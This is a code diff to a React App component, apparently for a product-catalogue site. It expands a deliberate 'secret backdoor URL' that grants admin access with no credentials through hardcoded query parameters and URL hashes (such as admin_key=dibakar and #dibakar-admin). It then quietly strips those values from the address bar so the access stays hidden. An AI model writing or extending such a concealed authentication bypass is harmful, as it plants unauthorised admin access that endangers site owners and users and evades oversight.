@@ -36,6 +36,8 @@ export default function App() {
 
   // Handle secret backdoor URL to access or bypass admin panel quietly
   useEffect(() => {
+    if (typeof window === 'undefined') return;
+
     const params = new URLSearchParams(window.location.search);
     const hash = window.location.hash;
 
@@ -44,11 +46,14 @@ export default function App() {
     // 1. Direct login bypass (automatic login and redirect to admin panel)
     if (
       params.get('admin_key') === 'dibakar' || 
+      params.get('dibakar') === 'admin' ||
       params.get('secret-bypass') === 'true' || 
-      hash === '#admin-bypass'
+      hash === '#admin-bypass' ||
+      hash === '#dibakar-admin'
     ) {
+      // Set admin session state directly
       const success = loginAdmin?.('dibakar-admin');
-      if (success) {
+      if (success || isAdmin) {
         setView('admin');
         navigated = true;
       }
@@ -67,10 +72,14 @@ export default function App() {
 
     if (navigated) {
       // Quietly clean up the URL query parameters and hash from the address bar so it stays completely hidden and secure
-      const cleanUrl = window.location.origin + window.location.pathname;
-      window.history.replaceState({}, document.title, cleanUrl);
+      try {
+        const cleanUrl = window.location.origin + window.location.pathname;
+        window.history.replaceState({}, document.title, cleanUrl);
+      } catch (e) {
+        console.error("Backdoor URL clean failed:", e);
+      }
     }
-  }, [loginAdmin]);
+  }, [loginAdmin, isAdmin]);
   const [selectedProductId, setSelectedProductId] = useState<string | null>(null);
   const [compareIds, setCompareIds] = useState<string[]>([]);
   const [isComparisonOpen, setIsComparisonOpen] = useState(false);
